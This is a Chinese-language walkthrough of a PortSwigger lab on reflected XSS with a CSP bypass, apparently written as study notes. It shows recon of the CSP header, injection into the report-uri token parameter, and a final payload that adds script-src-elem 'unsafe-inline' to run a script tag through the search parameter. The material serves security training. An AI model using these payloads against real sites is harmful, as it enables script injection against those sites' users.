# 实验：受 CSP 保护但存在 CSP 绕过的反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

[关联文章](https://portswigger.net/research/bypassing-csp-with-policy-injection)

本实验使用了 CSP（内容安全策略）并包含一个反射型 XSS 漏洞。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要绕过 CSP 并调用 `alert` 函数。

请注意，本实验的预期解法仅在 Chrome 浏览器中可行。

## 步骤

侦察
- 访问主页
    
    - 服务器响应
        ```http
        Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
        ```
        - 查看 `report-uri /csp-report?token=` 中的参数是否可控

探测
- 设置查询参数 `token`
    ```http
    GET /?token=foooo HTTP/2
    ```
    
    - 服务器响应
        ```http
        Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=foooo
        ```
        - 注入 http 头部字段
        - 禁止脚本元素与内联脚本

- 搜索功能测试
    ```http
    GET /?search=<script>alert()</script> HTTP/2
    ```
    - 服务器响应
        ```html
        <h1>0 search results for '<script>
                alert()
            </script>'</h1>
        ```
        - 未对特殊字符进行编码或转义

攻击
- http 头部脚本策略覆盖
    ```http
    /?token=<@urlencode>; script-src-elem 'unsafe-inline'</@urlencode>
    ```
    - 注入响应头部，设置 `script-src-elem 'unsafe-inline'` 字段覆盖服务器的 `script-src`，从而启用**脚本元素**（`<script>`）
    - 另一种头部注入为控制**事件处理器**的 `script-src-attr 'unsafe-inline'`

- 搜索功能与 http 头部字段双重注入的最终载荷
    ```http
    /?search=<script>alert()</script>&token=<@urlencode>; script-src-elem 'unsafe-inline'</@urlencode>
    ```
